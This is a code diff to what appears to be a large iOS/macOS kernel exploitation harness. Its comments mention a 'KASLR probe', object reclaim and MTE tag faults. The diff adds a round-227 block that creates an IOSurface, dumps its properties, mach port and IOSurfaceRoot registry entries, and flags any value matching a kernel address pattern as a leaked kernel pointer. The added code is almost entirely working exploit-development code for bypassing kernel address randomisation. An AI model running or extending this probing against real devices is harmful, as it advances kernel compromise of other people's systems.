@@ -20252,7 +20252,7 @@ new_modes:
          */
         if (rounds >= 170 && rounds != 219 && rounds != 225) {
             rlog("\n--- Phase 17: IOSurface shared memory + KASLR probe ---\n");
-            if ((rounds >= 220 && rounds <= 224) || rounds == 226) goto r220_block;
+            if ((rounds >= 220 && rounds <= 224) || rounds == 226 || rounds == 227) goto r220_block;
 
             dispatch_after(dispatch_time(DISPATCH_TIME_NOW, 60 * NSEC_PER_SEC),
                 dispatch_get_global_queue(0, 0), ^{
@@ -26588,6 +26588,154 @@ new_modes:
              * This avoids MTE tag faults because the reclaim allocates a fresh
              * entry with valid MTE tags.
              */
+            if (rounds == 227) {
+                rlog("\n=== r=227: IOSurface property scan via public API ===\n");
+
+                /* Use IOSurfaceCopyAllValues / IOSurfaceCopyValue for proper serialization */
+                CFMutableDictionaryRef sp227 = CFDictionaryCreateMutable(NULL, 0,
+                    &kCFTypeDictionaryKeyCallBacks, &kCFTypeDictionaryValueCallBacks);
+                int w227 = 64, h227 = 64, bpe227 = 4, bpr227 = w227 * bpe227;
+                CFNumberRef wn227 = CFNumberCreate(NULL, kCFNumberIntType, &w227);
+                CFNumberRef hn227 = CFNumberCreate(NULL, kCFNumberIntType, &h227);
+                CFNumberRef bn227 = CFNumberCreate(NULL, kCFNumberIntType, &bpe227);
+                CFNumberRef rn227 = CFNumberCreate(NULL, kCFNumberIntType, &bpr227);
+                int pf227 = 0x42475241;
+                CFNumberRef pfn227 = CFNumberCreate(NULL, kCFNumberIntType, &pf227);
+                CFDictionarySetValue(sp227, CFSTR("IOSurfaceWidth"), wn227);
+                CFDictionarySetValue(sp227, CFSTR("IOSurfaceHeight"), hn227);
+                CFDictionarySetValue(sp227, CFSTR("IOSurfaceBytesPerElement"), bn227);
+                CFDictionarySetValue(sp227, CFSTR("IOSurfaceBytesPerRow"), rn227);
+                CFDictionarySetValue(sp227, CFSTR("IOSurfacePixelFormat"), pfn227);
+
+                /* Set custom properties before creation */
+                int cust = 0xDEAD;
+                CFNumberRef custn = CFNumberCreate(NULL, kCFNumberIntType, &cust);
+                CFDictionarySetValue(sp227, CFSTR("CustomMarker"), custn);
+
+                IOSurfaceRef s227 = IOSurfaceCreate(sp227);
+                if (!s227) { rlog("  Create failed\n"); goto p227_cleanup; }
+                uint32_t sid = IOSurfaceGetID(s227);
+                rlog("  Surface ID=%u allocSz=%zu\n", sid, IOSurfaceGetAllocSize(s227));
+
+                /* Set some custom properties via setValue */
+                int64_t marker = 0x1234567890ABCDEFLL;
+                CFNumberRef markn = CFNumberCreate(NULL, kCFNumberSInt64Type, &marker);
+                IOSurfaceSetValue(s227, CFSTR("probe_marker"), markn);
+                CFRelease(markn);
+
+                /* Get base address (shared memory mapping) */
+                IOSurfaceLock(s227, 0, NULL);
+                void *ba227 = IOSurfaceGetBaseAddress(s227);
+                rlog("  Base addr: %p\n", ba227);
+                IOSurfaceUnlock(s227, 0, NULL);
+
+                /* Dump ALL values */
+                CFDictionaryRef allVals = IOSurfaceCopyAllValues(s227);
+                if (allVals) {
+                    CFIndex cnt = CFDictionaryGetCount(allVals);
+                    rlog("  CopyAllValues: %ld keys\n", (long)cnt);
+                    const void **keys = malloc(sizeof(void*) * cnt);
+                    const void **vals = malloc(sizeof(void*) * cnt);
+                    CFDictionaryGetKeysAndValues(allVals, keys, vals);
+                    for (CFIndex i = 0; i < cnt && i < 30; i++) {
+                        char kbuf[128] = {0};
+                        CFStringGetCString((CFStringRef)keys[i], kbuf, sizeof(kbuf),
+                            kCFStringEncodingUTF8);
+                        CFTypeID tid = CFGetTypeID(vals[i]);
+                        if (tid == CFNumberGetTypeID()) {
+                            int64_t nv = 0;
+                            CFNumberGetValue((CFNumberRef)vals[i], kCFNumberSInt64Type, &nv);
+                            rlog("    '%s' = 0x%llx (%lld)%s\n", kbuf,
+                                (unsigned long long)nv, (long long)nv,
+                                ((uint64_t)nv & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL
+                                    ? " *** KERNEL PTR ***" : "");
+                        } else if (tid == CFDataGetTypeID()) {
+                            CFIndex dlen = CFDataGetLength((CFDataRef)vals[i]);
+                            const uint8_t *dp = CFDataGetBytePtr((CFDataRef)vals[i]);
+                            rlog("    '%s' = <data len=%ld>", kbuf, (long)dlen);
+                            if (dlen >= 8) {
+                                uint64_t dv;
+                                memcpy(&dv, dp, 8);
+                                rlog(" [0]=0x%llx", (unsigned long long)dv);
+                                if ((dv & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL)
+                                    rlog(" *** KERNEL PTR ***");
+                            }
+                            rlog("\n");
+                        } else if (tid == CFBooleanGetTypeID()) {
+                            rlog("    '%s' = %s\n", kbuf,
+                                CFBooleanGetValue((CFBooleanRef)vals[i]) ? "true" : "false");
+                        } else {
+                            rlog("    '%s' = <type=%lu>\n", kbuf, (unsigned long)tid);
+                        }
+                    }
+                    free(keys); free(vals);
+                    CFRelease(allVals);
+                } else {
+                    rlog("  CopyAllValues: NULL\n");
+                }
+
+                /* Try to look up surface by ID from a different connection */
+                IOSurfaceRef s227b = IOSurfaceLookup(sid);
+                rlog("  Lookup by ID %u: %p (same=%d)\n", sid, (void*)s227b, s227b == s227);
+                if (s227b) {
+                    CFDictionaryRef vals2 = IOSurfaceCopyAllValues(s227b);
+                    if (vals2) {
+                        rlog("  Lookup surface has %ld keys\n",
+                            (long)CFDictionaryGetCount(vals2));
+                        CFRelease(vals2);
+                    }
+                    CFRelease(s227b);
+                }
+
+                /* Try to get mach port for the surface (might leak kernel obj addr) */
+                mach_port_t smp = IOSurfaceCreateMachPort(s227);
+                rlog("  Mach port: 0x%x\n", smp);
+                if (smp != MACH_PORT_NULL)
+                    mach_port_deallocate(mach_task_self(), smp);
+
+                /* Probe IORegistryEntry properties on IOSurfaceRoot */
+                io_service_t svc227 = IOServiceGetMatchingService(kIOMasterPortDefault,
+                    IOServiceMatching("IOSurfaceRoot"));
+                if (svc227) {
+                    CFMutableDictionaryRef regProps = NULL;
+                    IORegistryEntryCreateCFProperties(svc227, &regProps, kCFAllocatorDefault, 0);
+                    if (regProps) {
+                        CFIndex rc = CFDictionaryGetCount(regProps);
+                        rlog("  IOSurfaceRoot registry: %ld props\n", (long)rc);
+                        const void **rk = malloc(sizeof(void*) * rc);
+                        const void **rv = malloc(sizeof(void*) * rc);
+                        CFDictionaryGetKeysAndValues(regProps, rk, rv);
+                        for (CFIndex i = 0; i < rc && i < 20; i++) {
+                            char kb[128] = {0};
+                            CFStringGetCString((CFStringRef)rk[i], kb, sizeof(kb),
+                                kCFStringEncodingUTF8);
+                            CFTypeID tid = CFGetTypeID(rv[i]);
+                            if (tid == CFNumberGetTypeID()) {
+                                int64_t nv = 0;
+                                CFNumberGetValue((CFNumberRef)rv[i], kCFNumberSInt64Type, &nv);
+                                rlog("    reg '%s' = 0x%llx%s\n", kb,
+                                    (unsigned long long)nv,
+                                    ((uint64_t)nv & 0xFFFFFF0000000000ULL) == 0xFFFFFE0000000000ULL
+                                        ? " *** KERNEL PTR ***" : "");
+                            } else {
+                                rlog("    reg '%s' = <type=%lu>\n", kb, (unsigned long)tid);
+                            }
+                        }
+                        free(rk); free(rv);
+                        CFRelease(regProps);
+                    }
+                    IOObjectRelease(svc227);
+                }
+
+                p227_cleanup:
+                if (s227) CFRelease(s227);
+                CFRelease(custn);
+                CFRelease(wn227); CFRelease(hn227); CFRelease(bn227); CFRelease(rn227); CFRelease(pfn227);
+                CFRelease(sp227);
+                rlog("=== r=227 complete ===\n");
+                goto phase17_done;
+            }
+
             if (rounds == 226) {
                 rlog("\n=== r=226: IOSurface object layout probe via shared memory ===\n");
 
